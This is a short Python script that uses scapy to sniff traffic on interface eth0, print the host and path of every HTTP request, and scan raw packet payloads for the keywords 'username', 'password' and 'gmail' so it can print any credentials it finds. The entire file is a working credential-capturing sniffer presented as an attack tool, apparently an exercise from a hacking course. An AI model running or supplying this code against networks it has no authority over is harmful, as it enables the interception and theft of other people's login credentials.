#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)   # don't store in memory
    # throw into the prn function every time


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        key_words = ["username", "password", "gmail"]
        for key_word in key_words:
            if key_word in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>  " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n [+] Possible username/password >> " + login_info + "\n\n")







        # print(packet.show())




sniff("eth0")
# print(packet.show())  # to find the field

